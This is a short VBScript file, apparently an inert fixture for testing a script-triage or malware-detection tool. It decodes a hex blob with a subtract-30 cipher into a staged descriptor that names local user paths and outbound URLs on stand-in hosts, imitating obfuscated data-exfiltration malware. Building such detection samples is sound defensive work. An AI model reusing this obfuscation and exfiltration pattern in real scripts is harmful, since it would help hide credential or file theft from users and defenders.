Option Explicit
' Huntress Script Triage -- inert static-analysis fixture (wsh_vbscript_windows)
Const Material_9f203442 = "581f135e55564752551f4e5145435647414e5145434e0e525447524354474156544350554847540e57524e5143464154474f5156475e434643525647541f394b502a56565210394b502a56565234475357475556101710135e55564349474145515750561f145e45434f52434b4950414b461f45434f52434b49500f4815481818131646481b5e57544e1f4a565652551c11114815481818131646481b10475a434f524e47104b5058434e4b46111548461814434547104643565e575547544143494750561f2a575056544755552e4344114815481818131646481b5e484b4e47415243564a1f251c3e37554754553e3257444e4b453e2a575056544755552e43443e55564349470f4815481818131646481b104643565e57524e5143464157544e1f4a565652551c11114815481818131646481b10475a434f524e47104b5058434e4b461157524e514346111a47154617171643"
Const Codec_9f203442 = "hex_compact|subtract_modulo_256|1e"

Function Load_9f203442()
  Dim result(), ByTeInDeX
  ReDim result((Len(Material_9f203442) \ 2) - 1)
  For ByTeInDeX = 0 To UBound(result)
    result(ByTeInDeX) = CInt("&H" & Mid(Material_9f203442, ByTeInDeX * 2 + 1, 2))
  Next
  Load_9f203442 = result
End Function

Function Decode_9f203442(ByRef SoUrCeByTeS)
  Dim result(), ByTeInDeX, keyBytes, previous
  ReDim result(UBound(SoUrCeByTeS))
  For ByTeInDeX = 0 To UBound(SoUrCeByTeS)
    result(ByTeInDeX) = (SoUrCeByTeS(ByTeInDeX) + 30) Mod 256
  Next
  Decode_9f203442 = result
End Function

Function Recover_9f203442()
  Dim SoUrCeByTeS, DeCoDeDByTeS, DeScRiPtOrTeXt, NeUtRaL, ByTeInDeX, PaSs, ErRoRnUmBeR, ErRoRdEsCrIpTiOn
  NeUtRaL = Empty

  SoUrCeByTeS = Load_9f203442()

  PaSs = 0

  While PaSs < 1

    DeCoDeDByTeS = Decode_9f203442(SoUrCeByTeS)

    PaSs = PaSs + 1

  Wend

  DeScRiPtOrTeXt = ""

  For ByTeInDeX = 0 To UBound(DeCoDeDByTeS)

    DeScRiPtOrTeXt = DeScRiPtOrTeXt & Chr(DeCoDeDByTeS(ByTeInDeX))

  Next
  Recover_9f203442 = DeScRiPtOrTeXt
End Function

Function Inspect_9f203442()
  Inspect_9f203442 = Recover_9f203442()
End Function
